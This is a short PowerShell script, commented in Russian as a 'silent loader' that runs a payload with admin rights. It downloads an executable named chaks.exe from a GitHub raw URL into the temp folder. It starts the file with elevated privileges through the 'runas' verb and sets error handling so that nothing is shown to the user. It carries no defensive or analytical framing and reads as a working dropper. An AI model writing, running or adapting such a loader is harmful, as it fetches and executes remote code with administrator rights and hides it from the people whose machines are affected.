# Тихий загрузчик + запуск от админа
$ErrorActionPreference = 'SilentlyContinue'

$url = 'https://github.com/RecentFiles/ModSz25az/raw/refs/heads/main/chaks.exe'
$out = [System.IO.Path]::GetTempPath() + 'chaks.exe'

try {
    # Скачиваем файл
    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -ErrorAction Stop

    # Более надёжный запуск от имени администратора
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $out
    $psi.UseShellExecute = $true
    $psi.Verb = "runas"
    # $psi.WindowStyle = "Hidden"   # закомментировано, потому что часто мешает при runas

    [System.Diagnostics.Process]::Start($psi)
}
catch {
    # Ничего не показываем пользователю
}
